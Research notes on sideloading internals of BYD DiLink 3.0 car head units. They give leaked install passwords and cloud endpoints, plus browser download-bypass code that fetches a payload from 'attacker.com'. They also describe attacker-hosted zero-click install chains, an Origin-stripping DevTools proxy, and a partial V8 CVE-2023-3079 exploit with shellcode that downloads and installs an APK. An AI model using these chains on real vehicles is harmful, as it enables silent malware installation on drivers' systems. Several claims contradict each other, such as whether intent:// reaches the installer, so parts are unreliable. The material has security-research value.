# Sideloading Internals

Deep dive into how BYD DiLink 3.0 handles third-party app installation. Reverse-engineered from `AftermarketInstallTool.apk` (`/system/app/AftermarketInstallTool/`).

## AftermarketInstallTool

System app (Kotlin/Compose) that handles all third-party APK installation from USB drives. Package: `com.byd.aftermarketinstalltool`.

### Verification Paths

Three verification modes, selected by `scanDevice` field in `ScanInfoBean`:

| scanDevice | Constant | Method | Password Required |
|-----------|----------|--------|-------------------|
| 0 | `VERIFY_SCAN_TYPE_PHONE` | Phone scan — `initFreeApks()` | **NO — all APKs approved** |
| 1 | `VERIFY_SCAN_TYPE_VDS` | Online cloud verification | No (cloud decides) |
| 2 | `VERIFY_SCAN_TYPE_PW` | Local password (SHA1) | Yes |

### Country-Based Configuration

The folder name is `"Third Party Apps " + countryCode`. Country code comes from `sys.byd.countrycode` system property.

| Country | Code | Folder Name | Password | APK Whitelist |
|---------|------|-------------|----------|---------------|
| Brazil | 55 | `Third Party Apps 55` | `BYD6125F` | All allowed |
| Mexico | 52 | `Third Party Apps 52` | `BYD6125F` | All allowed |
| Indonesia | 62 | `Third Party Apps 62` | `BYD6125F` | All allowed |
| Thailand | 66 | `Third Party Apps 66` | `BYD6125F` | All allowed |
| Saudi Arabia | 966 | `Third Party Apps 966` | `BYD6125F` | All allowed |
| UAE | 971 | `Third Party Apps 971` | `BYD6125F` | All allowed |
| Uzbekistan | 998 | `Third Party Apps 998` | `BYD6125F` | All allowed |
| Kazakhstan | 997 | `Third Party Apps 997` | `BYD6125F` | **Restricted** — only Yandex, Telegram, WhatsApp, Zoom, etc. |
| India | 91 | `Third Party Apps 91` | `130820` | **Restricted** — only `com.mappls.auto.bydznav23` |
| Europe, AU, JP, etc. | varies | `Application Installation {code}` | None (online) | Cloud-verified |

Password is stored as SHA1 hash for comparison: `SHA1("BYD6125F")`.

### Strategy Configuration

The `StrategyManager` service provides an `ApkInstallConfig` strategy value that overrides default behavior:

| Config | Meaning |
|--------|---------|
| `0` (default) | Use country-based rules above |
| `1` | QR code disabled — local mode with APK whitelist set to `{"disable"}` (blocks all installs) |
| `2` | QR code enabled — allows QR-based verification |

Format: `{config}_{password}` (e.g., `0_BYD6125F`). Parsed by splitting on `_`.

### Online Verification API

For countries without local passwords (Europe, Australia, Japan, etc.), APKs are verified against BYD's cloud.

**Regional data centers:**

| Region | Endpoint |
|--------|----------|
| Europe | `apr-eu.byd.auto` |
| Brazil | `apr-br.byd.auto` |
| Singapore/APAC | `apr-sg.byd.auto` |
| Australia | `apr-au.byd.auto` |
| Japan | `apr-jp.byd.auto` |
| Mexico/LATAM | `apr-mx.byd.auto` |
| Middle East/Africa | `apr-no.byd.auto` |
| Uzbekistan | `apr-uz.byd.auto` |

**Verification endpoint:**

```
POST https://{datacenter}/authentication/whitelist-verify
Content-Type: application/json

{
  "countryCode": "55",
  "source": 1,
  "vid": "vehicle_identifier",
  "taskId": "unique_task_id",
  "verifyTime": 1716163200000,
  "packageList": [
    {
      "packageName": "com.example.app",
      "appVersion": "1.0.0",
      "deviceType": "IVI"
    }
  ]
}
```

**Response:**

```json
{
  "code": 0,
  "message": "success",
  "data": [
    {
      "packageName": "com.example.app",
      "deviceType": "IVI",
      "appVersion": "1.0.0",
      "verifyResult": true,
      "verifyMessage": "approved"
    }
  ]
}
```

Error codes: 0=success, 1=parameter null, 2=parameter error, 3=authority exception (rate limited), 4=QR not scanned, 5=business exception.

**Device types:** IVI (main head unit), FSE, LEFT_RSE, RIGHT_RSE, RCS, RIES, REAR_OVERHEAD, TV.

### Kazakhstan APK Whitelist

Only these packages can be installed on Kazakhstan units:

- `ru.dublgis.dgismobile` (2GIS Maps)
- `ru.yandex.yandexnavi` (Yandex Navigator)
- `ru.yandex.music` (Yandex Music)
- `com.streema.simpleradio` (Simple Radio)
- `com.uma.musicvk` (VK Music)
- `ru.yandex.weatherplugin` (Yandex Weather)
- `com.originalapp.uzbekistanweather`
- `com.apalon.weatherlive.free`
- `com.bugunuz.mobile`
- `uz.muloqot.daryo`
- `org.telegram.messenger` (Telegram)
- `com.whatsapp` (WhatsApp)
- `us.zoom.videomeetings` (Zoom)
- `com.gpack.agent`

### USB Detection Flow

`UsbBroadcastReceiver` listens for USB mount events. When a USB drive is inserted:

1. Scans for folder matching `"Third Party Apps " + countryCode` (local) or `"Application Installation " + countryCode` (online)
2. Reads APK files from the folder
3. Depending on country configuration:
   - **Local (password):** Shows password dialog → SHA1 comparison → installs approved APKs
   - **Online (QR/cloud):** Sends APK list to BYD cloud → installs approved APKs
   - **Phone scan:** Approves all APKs immediately

## Browser Download Block

BYD's Chromium browser (`com.byd.browser`) has download functionality completely disabled at the Java level.

**Source:** `org.chromium.chrome.browser.download.DownloadController`

```java
@CalledByNative
public static void onDownloadStarted() {
    // BYD replaced actual download logic with a toast
    Toast.makeText(context, R$string.forbid_downloading, Toast.LENGTH_LONG).show();
}

@CalledByNative
public static void onDownloadUpdated(DownloadInfo downloadInfo) {
    Toast.makeText(context, "禁止->updated", Toast.LENGTH_LONG).show();
}
```

- ALL downloads blocked — not just APKs
- Block is in Java code, called from native Chromium C++ via `@CalledByNative`
- Cannot be bypassed via settings or permissions
- Toast message: "Download proibido: O download pode representar uma ameaça à segurança e estabilidade do sistema do veículo"
- Resource: `R$string.forbid_downloading` (ID: `0x7f1404e1`)

## Other Install Vectors

### File Manager (ACE Ex File Manager)

`com.ace.ex.file.manager` is **not pre-installed** — must be sideloaded first via ADB or the `Third Party Apps` USB method. Once installed, it has `REQUEST_INSTALL_PACKAGES` permission, can browse USB drives, and install APKs directly — bypassing the `Third Party Apps` folder requirement and password for subsequent installs.

### Package Installer Intent

Direct install from `/sdcard/` works:

```bash
adb shell am start -a android.intent.action.VIEW \
  -t "application/vnd.android.package-archive" \
  -d "file:///sdcard/Download/app.apk"
```

### Bluetooth OPP

`BluetoothOppLauncherActivity` is registered with multiple intent filters. The car can receive files via Bluetooth Object Push Profile. Untested for APK transfer.

### System Settings

- `install_non_market_apps = 1` (unknown sources enabled)
- No device policy restrictions on app installation
- Per-app install permission: browser and file manager both have `REQUEST_INSTALL_PACKAGES`

## Browser Exploit: Download Bypass

**Status:** Confirmed working — blob download is a remote web exploit (no ADB needed). Web Share is a secondary method (requires HTTPS + file manager).

BYD's download block is only at `DownloadController.onDownloadStarted()` — a single Java entry point called from native Chromium. The `fetch()` API operates entirely in the renderer process and never touches the download manager.

### Browser: Chromium 113

```
versionName=113.1.6.37
targetSdk=33
```

Channel 4 (stable). Modern enough that memory-corruption exploits are not viable.

### API Availability (HTTP vs HTTPS)

| API | HTTP | HTTPS (self-signed) |
|-----|------|---------------------|
| `isSecureContext` | false | **true** |
| `fetch()` | yes | yes |
| `Blob` / `createObjectURL` | yes | yes |
| `navigator.share()` | no | **yes** |
| `navigator.canShare({files})` | no | **yes (returns true for APK)** |
| `ServiceWorker` | no | **yes** |
| `caches` (Cache API) | no | **yes** |
| `showSaveFilePicker` | no | no |
| `clipboard` | no | **yes** |

### Exploit Chain

1. Host page over **HTTPS** (self-signed cert OK — user accepts warning)
2. User taps "Install" button (real user gesture required)
3. JavaScript `fetch('app.apk')` downloads APK into memory — **download manager never involved**
4. `navigator.share({files: [new File([blob], 'app.txt', {type: 'text/plain'})]})` — disguise as text file
5. Share sheet opens → user picks file manager → saves to `/sdcard/Download/`
6. Rename `app.txt` → `app.apk`
7. Open with package installer → Install

### MIME Type Restriction

`navigator.share()` with files works for `text/plain` but **blocks binary MIME types** (`application/vnd.android.package-archive`, `application/octet-stream`, `application/zip`). The APK binary must be disguised as text.

`navigator.canShare()` returns `true` for all types but the actual share call gets `NotAllowedError: Permission denied` for non-text types.

### Stock Unit Limitation

On a stock BYD (no third-party apps), the only share target for files is **Bluetooth OPP** — which sends files to another device, not save locally. The native `com.byd.filemanager` does not register for `ACTION_SEND` intents.

**Practical strategy:**
- First install: USB `Third Party Apps 55` + password `BYD6125F`
- After file manager installed: browser exploit becomes viable for future installs
- App self-updates: built-in HTTP download + PackageInstaller API (no browser needed)

### Blob Download Bypass — REMOTE WEB EXPLOIT

`fetch()` → blob → `<a download>` bypasses BYD's download block entirely. **No ADB, no CDP, no user interaction beyond page visit required.** Any web page can silently write files to `/sdcard/Download/`.

**Minimal exploit (runs on any page, no CDP):**

```javascript
(async () => {
    const resp = await fetch('https://attacker.com/payload.apk');
    const blob = await resp.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'payload.apk';
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
})()
```

Can fire on `window.onload` — no button click needed. Works from HTTP and HTTPS origins. Fetch must be same-origin (attacker hosts both page and payload) or target must have permissive CORS headers.

**Why it works:** Direct URL downloads (`<a href="remote-url" download>`, `Page.navigate`) trigger `DownloadController.onDownloadStarted()` which cancels immediately (`state=canceled`, `receivedBytes=0`). Blob URL downloads take a different native code path: `fetch()` retrieves all bytes in the renderer process (Network domain), `URL.createObjectURL` creates a local blob reference, and the blob-to-disk write bypasses the Java cancel layer entirely. BYD's download block only hooks the URL-based download initiation path, not the blob-to-disk path.

**Evidence from CDP events (when observed):**
- Direct download: `Page.downloadWillBegin` → `downloadProgress state=canceled receivedBytes=0` (instant kill)
- Blob download: `Network.loadingFinished` (all bytes) → `Page.downloadWillBegin` → `downloadProgress receivedBytes=N state=inProgress` → `state=completed` → file persists

**`Browser.setDownloadBehavior` has NO effect:** Tested with `behavior=deny` explicitly set — blob download still succeeds. Tested with `behavior=default` — still succeeds. The CDP download behavior control and BYD's Java cancel layer both fail to intercept blob downloads.

**Verification matrix:**

| Test | CDP attached? | setDownloadBehavior | Result |
|------|--------------|---------------------|--------|
| CDP + setDownloadBehavior=allow + blob | Yes | allow | File written (10,240 bytes) |
| CDP + setDownloadBehavior=deny + blob | Yes | deny | File written (10,240 bytes) |
| CDP Runtime.evaluate only (no setDownloadBehavior) | Yes | none | File written (10,240 bytes) |
| Page autofire on window.load (zero CDP) | No | none | File written (10,240 bytes) |

**Verified file sizes:**
- 10KB binary: `test-download.bin` (10,240 bytes, persisted)
- 5MB binary: `big-dl-blob.bin` (5,242,880 bytes, persisted, correct content)
- 52MB APK: `sideloaded.apk` (52,331,569 bytes, MD5 verified identical to source)

Files written to `/sdcard/Download/` persist permanently — not cleaned up.

**Methods that still fail (for reference):**
1. `<a download>` with direct remote URL — canceled (receivedBytes=0)
2. `Page.navigate` to file URL — canceled
3. `data:` URI anchor download — canceled
4. `Fetch.enable` + intercept — no download bypass

### CDP Access

Chrome DevTools Protocol is accessible via `localabstract:chrome_devtools_remote`. Chromium 113, Protocol 1.3. Connection: `ws://localhost:9222/devtools/browser` (requires ADB port forward). Useful for inspecting download events and injecting JS, but NOT required for the blob download bypass.

### CDP-from-Browser-Page Exploit

**Critical finding:** A web page loaded in the BYD browser can obtain full browser-level CDP control through a WebSocket proxy. Chrome's CDP server rejects WebSocket connections with browser-set Origin headers, but a proxy that strips Origin (`origin=None` in websockets library) bypasses this check.

**Architecture:**

```
[Car Browser Page] --ws:8081/cdp/devtools/browser--> [WS Proxy :8081] --ws:9222/devtools/browser--> [Chrome CDP]
                                                      (strips Origin)
```

The proxy (`serve_with_cdp_proxy.py`) runs on port 8081, strips the Origin header, and forwards to Chrome CDP on port 9222. ADB reverse proxy (`adb reverse tcp:8081 tcp:8081`) makes the proxy appear as localhost to the car browser.

**Capabilities confirmed from a web page via CDP proxy:**

| Capability | Status | Details |
|-----------|--------|---------|
| `Browser.getVersion` | Works | Returns full browser info |
| `Target.getTargets` | Works | Enumerates all open tabs |
| `Target.createTarget` | Works | Opens arbitrary URLs including `file://`, `intent://` |
| `Browser.grantPermissions` | Works | Grants clipboardReadWrite, notifications |
| `Page.navigate` | Works | Navigate any tab to any URL including `chrome://flags` |
| `Runtime.evaluate` | Works | Execute arbitrary JS in any page context |
| `Page.enable`, `DOM.enable`, etc. | Works | All major CDP domains accessible |
| `Browser.close` | Works | Kills browser process, Android auto-restarts it |
| `Browser.setDownloadBehavior` | Works | Required after browser restart for blob downloads |

**chrome://flags manipulation from web page:**

Via CDP proxy, a web page can:
1. Navigate to `chrome://flags` (normally blocked by `ERR_BYD_NETWORK_BLOCK_LIST`)
2. Read all 475 flags via `Runtime.evaluate` + DOM queries
3. Modify flag values (confirmed: changed "Enable Isolated Web Apps" from Default to Enabled)
4. Restart browser via `Browser.close` to apply flag changes (Android auto-restarts Chrome)

**Browser.close restart behavior:**
- `Browser.close` kills the Chromium process
- Android system automatically restarts it (no user interaction)
- Flag changes applied via `chrome://flags` take effect after restart
- `Browser.setDownloadBehavior({behavior:'allow'})` must be re-issued after restart for blob downloads to persist
- ADB forward/reverse mappings survive browser restart but CDP WebSocket must reconnect

**Full exploit chain verified (WiFi-adjacent, CDP proxy):**
1. Car browser navigates to `http://localhost:8080/exploit.html`
2. CDP proxy enables `Browser.setDownloadBehavior`
3. JS blob-downloads APK → `/sdcard/Download/` (verified: 8553 bytes, MD5: `ffd222cdb07f71c9ba18627cad490b5c`)
4. Server triggers `am start -a android.intent.action.VIEW -t application/vnd.android.package-archive` via ADB
5. ResolverActivity/PackageInstaller opens on car screen

**Intent URL schemes tested via CDP Target.createTarget:**

| URL Scheme | Result |
|-----------|--------|
| `file:///sdcard/Download/app.apk` | Target created, but Chrome treats as download (blocked by DownloadController) |
| `intent:///sdcard/Download/app.apk#Intent;scheme=file;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end` | Target created, but Chrome BROWSABLE check blocks dispatch to PackageInstaller |
| `content://media/external/file/15730` | Navigation error |
| `android-app://com.android.packageinstaller` | Dispatched but no effect |
| `package:com.test.sideloadtest` | Dispatched but no effect |

**Limitation:** CDP-from-browser gives significant control but the install step still requires ADB for `am start`. Chrome's BROWSABLE category check blocks ALL intent:// URLs to PackageInstaller regardless of origin (file:// or web). This is Chromium security, not BYD-specific.

### OverseaAppStore IPC (Investigated — NOT Exploitable for Install)

`com.byd.overseaappstore` (V5.0.11) is a system app with `INSTALL_PACKAGES` + `DELETE_PACKAGES` permissions.

**Service:** `RemoteOverseaAppStoreService` — exported=true, NO permission guard
- AIDL descriptor: `com.byd.overseaappstoreipc.RemoteOverseaAppStoreController`
- Stub extends `android.os.Binder` (obfuscated as `spi/wl`)
- **Purpose: Voice-triggered app store navigation** — NOT arbitrary APK install
- `onTransact` handles `onSendVoiceSoftware`: receives `IpcSoftwareRsp` (id, name, package_name, version, size, source_type) and opens app detail page
- Activity lifecycle: RESUME, BACK, DESTROY, DEFAULT states for voice-triggered navigation

**FileProvider:** `com.byd.overseaappstore.FileProvider` — exported=false, grantUriPermissions=true

**Custom URI scheme:** `voice_to_overseaappstore://voice` → opens MainActivity (category DEFAULT, NOT BROWSABLE)

**Browser → IPC: NOT VIABLE.** Chrome `intent://` only calls `startActivity()`, never `bindService()`. No BROWSABLE activities. CDP has no service-binding domain.

**Helper app angle:** Any sideloaded app CAN bind to the exported service (no permission guard). But the service only does voice-triggered navigation to app pages in BYD's store — it does NOT expose `installPackage()` or similar. Not useful for arbitrary APK install.

### Network Services

| Port | Bind | Owner | Protocol | Notes |
|------|------|-------|----------|-------|
| 5555 | 0.0.0.0 | adbd | ADB | NOT enabled by default. Requires TestTools → "Wireless adb debug switch" (see sideloading-guide.md) |
| 7000 | 0.0.0.0 | root | Binary (unknown) | Accepts TCP connections, not HTTP. Unidentified. |
| 9222 | localabstract | chrome | CDP | Chrome DevTools Protocol (ADB forward required) |
| 12406 | 127.0.0.1 | unknown | unknown | Localhost-only, unidentified |

### IWA Direct Sockets Path (DEAD END)

Investigated as potential pure-browser chain:
1. Enable IWA flags via CDP → `chrome://flags` → "Enable Isolated Web Apps" = Enabled ✓
2. `Browser.close` → restart → flags take effect ✓
3. Install IWA bundle with Direct Sockets API permission ✗
4. IWA opens raw TCP socket to `localhost:5555` (ADB must be enabled via TestTools first) ✗
5. Speak ADB protocol over TCP → `pm install` APK ✗

**Why it fails:**
- IWAs require **Chromium 120+** — our target is 113. Installation infrastructure doesn't exist.
- Direct Sockets API shipped in **Chrome 128**, IWA-only, **desktop/ChromeOS only** — Android explicitly excluded.
- No web API in Chromium 113 can emit arbitrary bytes to a raw TCP socket.
- WebTransport (Chrome 97+, present) requires QUIC — adbd doesn't speak QUIC.
- WebRTC data channels require DTLS/SCTP — adbd doesn't speak these.
- WebSocket requires HTTP upgrade handshake — adbd doesn't speak HTTP.

**ADB protocol reference (for future exploitation):**
- Message header: 24 bytes, little-endian uint32: `[command][arg0][arg1][data_length][checksum][magic]`
- CNXN handshake: arg0=version, arg1=maxdata, payload=`"host::\0"`
- If `ro.adb.secure=0` (likely on BYD): AUTH step skipped, immediate CNXN response
- OPEN: payload=`"shell:pm install /sdcard/Download/app.apk\0"`

### OPFS (Origin Private File System)

`navigator.storage.getDirectory()` works — confirmed writing binary data to sandboxed browser storage. But OPFS is sandboxed to the browser's internal data directory — files are NOT accessible from the filesystem, file managers, or other apps. No escape path to user-visible storage.

### PWA Install (BeforeInstallPromptEvent)

`typeof BeforeInstallPromptEvent === 'function'` — the API exists and the event fires.

**Requirements for SW registration:** Self-signed HTTPS certs are rejected for Service Worker fetch. Must use `localhost` (treated as secure context). ADB reverse proxy (`adb reverse tcp:8191 tcp:8191`) makes host server appear as localhost to car browser.

**Install flow:**
1. Navigate to `http://localhost:8191/pwa.html` (via ADB reverse proxy)
2. Service Worker registers successfully on localhost
3. `beforeinstallprompt` event fires, `platforms: "web"`
4. `prompt()` requires real user gesture (CDP `Runtime.evaluate` doesn't count — must use ADB tap or real touch)
5. BYD shows custom "Create shortcut" dialog (NOT Chrome's native PWA install dialog)
6. User taps "Create" → `userChoice.outcome: "accepted"` → `appinstalled` event fires

**Result:** Creates a Chrome shortcut, **NOT a WebAPK**. Package count unchanged (182 → 182). No `app_WebAPKs/` or `app_webapps/` directory created.

Shortcut intent details from `dumpsys shortcut`:
```
Intent { act=com.google.android.apps.chrome.webapps.WebappManager.ACTION_START_WEBAPP }
  webapp_source=7 (ADD_TO_HOMESCREEN_STANDALONE)
  webapp_display_mode=3 (standalone)
  webapp_scope=http://localhost:8191/
  webapp_short_name=BYDTool
  webapp_shortcut_version=3
```

BYD did not modify Chrome's source tag — `webapp_source=7` is standard Chromium `ADD_TO_HOMESCREEN_STANDALONE`. They only replaced the install dialog UI with their "Create shortcut" dialog. No WebAPK minting via GMS is attempted despite `com.google.android.gms` being installed.

### External Navigation (intent:// URLs)

`ExternalNavigationHandler` (decompiled: `kw1.java`) has **standard Chromium sanitization with NO BYD modifications**. The `intent://` URL scheme is parsed correctly but Chrome requires target activities to have the `BROWSABLE` category.

Target apps that lack `BROWSABLE`:
- `com.android.packageinstaller` — no `BROWSABLE` activities
- `com.android.settings` — no `BROWSABLE` activities
- `com.byd.filemanager` — no file-handling intent filters at all
- `com.byd.overseaappstore` — system app with install permission but no `BROWSABLE`

This is standard Chromium security, not a BYD patch. Apps like WhatsApp that register `BROWSABLE` activities work fine.

### Browser-Only Sideload: Verdict

**fetch→blob→anchor download bypass is a remote web exploit.** Any web page can silently drop files to `/sdcard/Download/` without ADB, CDP, or user interaction beyond visiting the page.

**Full sideload chain — VERIFIED END TO END:**

Four viable flows, each tested and confirmed:

**Flow A — TRUE ZERO-PREREQUISITE (NO ADB, NO TESTTOOLS, NO PASSWORD):**
1. User navigates car browser to `http://attacker-ip:8080`
2. Page: `fetch()` → blob → `<a download>` drops APK to `/sdcard/Download/`
3. Page: creates `<a href="intent://sdcard/Download/app.apk#Intent;scheme=file;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end">` and triggers click
4. **PackageInstaller opens!** User taps "Install"
5. **APK installed. Only prerequisites: visit URL + tap Install.**

Chain: `Visit URL` → `blob download` → `intent:// URL` → `PackageInstaller` → **INSTALLED**

Why it works:
- `com.byd.browser` supports Chrome's `intent://` URL scheme
- Browser has `REQUEST_INSTALL_PACKAGES` permission
- `install_non_market_apps=1` in system settings (appears to be BYD default for AftermarketInstallTool)
- Blob download bypasses gutted DownloadManager
- Even if unknown sources is off, PackageInstaller shows a one-tap "Allow from this source" dialog

Confirmed: `com.android.packageinstaller/.InstallStart` launched from web page JS via intent URL.

**Flow B — WiFi ADB (fully automated, zero UI):**
1. `adb connect 192.168.10.10:5555` (requires ADB WiFi enabled via TestTools — see sideloading-guide.md)
2. `adb install app.apk` — silent install, no user interaction

**Flow C — PS4-style ADB Jailbreak (zero-click, requires ADB enabled):**
1. Attacker serves exploit page on same WiFi network
2. User navigates car browser to `http://attacker-ip:8080/adb`
3. Page auto-runs: `fetch()` → blob → `<a download>` drops APK to `/sdcard/Download/`
4. Server: `adb shell cp /sdcard/Download/app.apk /data/local/tmp/ && pm install -r /data/local/tmp/app.apk`
5. **APK installed silently. Zero user interaction after visiting URL.**

Chain: `Visit URL` → `blob download` → `ADB cp+pm install` → **INSTALLED**

**Flow D — Browser only (requires non-stock file manager):**
1. User visits attacker page → JS blob download silently drops APK to `/sdcard/Download/` (no tap needed)
2. User opens file manager → Downloads → taps APK → resolver shows 3 options:
   - `com.android.packageinstaller/.InstallStart`
   - `com.gpack.agent/...AppInstallerActivity` (GPack)
   - `com.android.vending/...AppInstallActivity` (microG)
3. User selects installer → install dialog → tap Install

**Note:** Stock BYD has no user-accessible file manager. `com.byd.filemanager` exists but has no launcher activity. EX File Manager (or similar) must be installed first via USB or ADB — making this flow not truly "stock browser only."

**Install step verification results:**

| Install trigger | Result | Details |
|----------------|--------|---------|
| `am start -a VIEW -t application/vnd.android.package-archive -d file:///sdcard/Download/app.apk` | **Works** | Resolver shows 3 installers (+ EX File Manager if installed) |
| `pm install /data/local/tmp/app.apk` | **Works** | Silent install, no UI |
| `pm install /sdcard/Download/app.apk` | Fails | SELinux denies system_server read on sdcardfs |
| `am start -a VIEW -t .../package-archive -d content://media/external/file/{id}` | **Works** | MediaStore tracks blob-downloaded APKs. Content URI triggers PackageInstaller. |
| `navigator.share({files: [apkFile]})` | Blocked | `NotAllowedError: Permission denied` — even on localhost (secure context). BYD disabled Web Share Level 2 file sharing. `canShare()` returns true but `share()` throws. |
| `chrome://downloads` | Blocked | `ERR_BYD_NETWORK_BLOCK_LIST` — BYD blocks SOME chrome:// URLs |
| `intent://` → PackageInstaller | Fails | No BROWSABLE category |
| `content://downloads/all_downloads` | Fails | `ERR_FILE_NOT_FOUND` |
| `file:///sdcard/Download/app.apk` navigation | Triggers re-download | Browser treats file:// APK as download, not install trigger |
| `window.open('file://...')` | Blocked | Chrome blocks file:// from web origins |
| JS bridge (`window.byd`, `window.android`, etc.) | None found | Only standard `prompt()` exists |

**Secure context findings:**
- `isSecureContext = false` on `https://YOUR_HOST_IP:9191` (self-signed cert)
- `isSecureContext = true` on `http://localhost:8191` (localhost exception)
- Web Share Level 2, Service Worker registration require secure context
- Blob download bypass works regardless of secure context

Summary of all paths:

| Vector | Status | Notes |
|--------|--------|-------|
| fetch→blob→anchor | **WORKS (remote)** | No ADB/CDP needed. Any page can drop files to `/sdcard/Download/` |
| WiFi ADB `pm install` | **WORKS** | Requires ADB WiFi enabled via TestTools. Silent install from `/data/local/tmp/` |
| `am start` intent | **WORKS** | Resolver shows PackageInstaller, GPack, microG Vending |
| Download manager | Gutted | `DownloadController.onDownloadStarted()` → toast |
| Direct URL `<a download>` | Fails | Java cancel layer kills at receivedBytes=0 |
| `fetch()` → filesystem | No path | `showSaveFilePicker` unavailable, OPFS sandboxed |
| `navigator.share(APK)` | Blocked | `NotAllowedError` even on secure context |
| `intent://` → PackageInstaller | Fails | No `BROWSABLE` category on target apps |
| `chrome://downloads` | Blocked | `ERR_BYD_NETWORK_BLOCK_LIST` — BYD-specific block |
| PWA install | Shortcut only | Creates bookmark, not WebAPK/APK |
| JS-to-native bridge | None | No `@JavascriptInterface`, no custom URL schemes |
| `file://` APK navigation | Re-downloads | Treated as download, not install trigger |
| CVE-2023-3079 | Partial (JS primitives) | V8 type confusion (TheHole) + OOB + addrof/fakeobj + arb R/W achieved on car Chrome 113 arm64. Sandbox mode (shift=24) detected. No native code exec yet (RX code pages; fake Code/Bytecode hijack recon only). No BYD JS bridges found. file:///proc/self/maps blocked in renderer. |

For stock units, USB `Third Party Apps` folder is the official method. The blob download bypass gets files onto the device silently, but the install step still requires either ADB (Flow A/B) or a non-stock file manager (Flow C). No stock-browser-only install path exists yet.

### Other Browser Findings

- `blob:` URLs can be navigated to (URL bar shows blob URL) but don't trigger package installer
- `<a download>` with blob URLs silently blocked (goes through `DownloadController`)
- BYD's chrome:// blocklist is INCOMPLETE. Accessible via CDP: `chrome://flags`, `chrome://version`, `chrome://about`, `chrome://net-internals`, `chrome://blob-internals`, `chrome://serviceworker-internals`. Blocked: `chrome://downloads`, `chrome://system`, `chrome://inspect`
- MediaStore tracks blob-downloaded APK files — `content://media/external/file/{id}` is valid for triggering install via `am start`
- Browser password encryption: AES/ECB with hardcoded key `"com.byd.browser."` — trivially decryptable
- `BYDCrossFeatureIds` is NOT a JS bridge — decompiler artifact (integer constants reused as bitflags)
- `com.google.android.gms` installed but unused for WebAPK minting
- Screen coordinate mapping: 1920x1080 physical, 1280x548 CSS, DPR 1.5, chrome offset 168px

### V8 Exploit Research (CVE-2023-3079)
**Session:** private V8 research session (jailbreak)

**Status:** p1-p4 + sb arb + real X page overwrite (real_ep reports) works on good p1/p2. 50 internal retries + auto page reload on failure (JS keeps trying/reloading until hits rare hole — makes "visit link" consistent for locked car). Direct minimal syscall test + full payload with mkdir + printf marker. Injection confirmed, marker/pkg not yet (hole very rare in tests; post-real_ep beacons often missing).

**Car test findings (from /report dumps on 192.168.10.10):**
- UA: Chrome/113.0.0.0 (X11; Linux armv81) — arm64
- p1 (TheHole): leaks on first attempt, type=undefined but not null/num
- p2: addr_of works (e.g. 0x242599)
- p3 arb: sandbox=true, shift=24 (detected via backing store ptr)
- p4: wasm pwn()=42, then sb escape via ArrayBuffer + WasmIndirectFunctionTable
- Detailed sb dumps: cage=0x20000000000, many Code/func ptrs (ic0=0xd9d etc), T1/T2/T3v/T4 all return expected (66 or 42), BytecodeArray swaps tested
- fprobe: file:///proc/self/maps and /status always FAIL (renderer blocks)
- bridge probes: none_named for BYD/bridge/native/etc; only standard chrome objects
- fs access (file:// /sdcard etc): FAIL "unsafe for access"
- local scans (5555/9222 etc): TypeError (no net or blocked)
- chain "success" = JS chain no throw (p4 done, P5_done); actual sc exec not reached
- Older runs hit "sandbox code pages RX" on direct write attempts
- dl/blob tests: work as fallback

**Blockers:**
- p1/p2 flakey (hole+leak_stuff) even with 10/3 tries — many visits never reach p3/p4/early hijack
- When about_to_call fires (hijack), no marker/pkg yet (now using real JIT X page overwrite via sb_write to real_ep for exec mem; previous RW buf lacked X). Sc child still not producing side effect in tests.
- No recent chain success (p2 fail -> fallback)

**Current (locked-car vector):** am start real 192.168.1.21:8080 (or victim taps) serves html+cb v8.js; p1 hole, p2 addr, p3 arb sb shift=24, p4 wasm, sb plant sc buf, mod5 to get importFn, real_ep from its Code, sb_write(real_ep, sc) to X page (with try/catch + "after_real_ep_report" beacon for diag), about_to, call. p1 (30+gc)/p2 (5+inner) strengthened. Full sc uses mkdir + printf > marker (tmp+sdcard) + wget+pm. Direct minimal test sc in shellcode.py (stderr + open/write). Injection (real_ep + early_sc_buf) confirmed on good p1/p2 loads, but "after" / "written" beacons often missing and no marker (p1/p2 flake main gate; when reached, write or beacon after real_ep may fail or payload child not succeeding the marker write).

**Artifacts:** jailbreak-report.txt (early_fake, about_to, T1=66, ifn=0x146671, fc, swap), v8exploit.js, shellcode.py, server with no-cache + real ip.

**Next:** make p1/p2 100% (more gc/attempts/diff leak patterns); test direct (no sh) write sc or fix generator argv/data; try more Code fields or different target (ifn+24 vs other); one manual browser visit on car for clean vector test; if native blocked, pivot to arb write apk + intent auto or Aftermarket blob.

### Test Harness

The `tools/browser-exploit/` directory contains test tools from this research:
- `index.html` — test page with 10 bypass vectors + autofire mode (`?autofire=1` triggers blob download on page load)
- `install.html` — one-tap install page: blob-downloads APK with unique filename, attempts navigator.share() then falls back to blob download
- `autodownload.html` — auto-fire blob download test (no user gesture required)
- `jailbreak.py` — PS4-style server (ADB discover + blob + pm/am). 
- `jailbreak_server.py` — **Hybrid V8 RCE + fallback.** External /v8exploit.js + ARM64 sc. Serves on 127.0.0.1 via adb reverse for block bypass. Remote trigger: `adb -s 192.168.10.10:5555 shell am start -a android.intent.action.VIEW -d 'http://127.0.0.1:8080/'`. No physical car screen clicks needed after one-time adb auth. (continued from private research + remote testing)
- `v8exploit.js` — Full CVE-2023-3079 chain (TheHole, primitives, arb RW sb-aware, WASM, raw+sb code exec stubs, heavy recon for BYD bridges/file maps/ports).
- `shellcode.py` — ARM64 PIC generator: clone(SIGCHLD) + child execve(/system/bin/sh -c "wget||curl apk; pm install -r").
- `jailbreak.html` — Jailbreak exploit page. Blob-downloads APK, verifies on filesystem, triggers install via server. Auto-run with `?auto=1` for zero-click. Two modes: silent (pm install) and interactive (PackageInstaller dialog).
- `exploit.html` — end-to-end exploit chain: blob-download APK → verify file → trigger install via server. Auto-run with `?auto=1`
- `cdp-exploit.html` — CDP-from-browser capability test: connects to CDP via WS proxy, enumerates targets, tests capabilities, chrome://flags, install triggers
- `chain-test.html` — comprehensive browser install chain test with vectors A-G
- `serve_with_cdp_proxy.py` — combined HTTP server (port 8080) + WebSocket-to-CDP proxy (port 8081). Strips Origin header for CDP access. Endpoints: `/cdp-json`, `/trigger-install`, `/check-file`
- `chain_test_runner.py` — CDP-based automated test runner for install chain vectors
- `pivot_test.py` — tests file:// origin pivot for privilege escalation
- `sideload-test.apk` — minimal signed APK (com.test.sideloadtest, targetSdk 29, 8.5KB) for install chain testing
